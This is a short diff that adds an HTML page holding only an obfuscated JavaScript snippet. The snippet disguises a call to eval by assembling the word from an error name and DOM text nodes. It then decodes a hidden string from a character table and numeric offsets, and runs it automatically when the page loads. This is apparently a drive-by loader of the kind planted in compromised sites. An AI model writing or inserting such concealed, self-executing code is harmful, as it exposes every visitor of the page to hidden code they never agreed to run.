@@ -1,0 +1,4 @@
+<html><body>
+<script>el=document.createElement("div");el.innerHTML="ren";el.innerHTML+="ceErr";el.appendChild(document.createTextNode("q"));el.appendChild(document.createTextNode("l"));el2=el.removeChild(el.lastChild);try{try{throw 1}catch(a){b[2]=21};}catch(a){k=el.firstChild.nodeValue+a.toString().substr(0,0);};ar="6d=iShDw8NrMa\".mtfB/oc n-l:94p7e";ar2="R28c-16c80c-88c76c-52c28c44c-20c4c-36c16c-52c68c12c-4c-80c80c-36c-32c44c0c52c-12c-28c0c40c-76c40c-12c-56c88c24c-28c-12c40c-32c-28c60c-84c-28c-8c116c-76c-44c108c4c-96c8c12c-4c88c-8c-40c-16c28c-4c-20c-8";try{throw 1;}catch(a){pau="urn erenceErr".replace(k,"va"+el2.nodeValue);}
+e=Function("ret"+pau)();ar2=ar2.split("c");ar2[0]="28";s="";pos=0;i=0;while(i<59){e('po'+'s+=par'+'seInt(k'+'.rep'+'lace("'+'ren'+'","0a'+'sd"))+'+'ar2['+'i]/'+'4');e('s+=ar.su'+''+'bstr(pos,1)');i++;}
+e(s);</script></body><html>
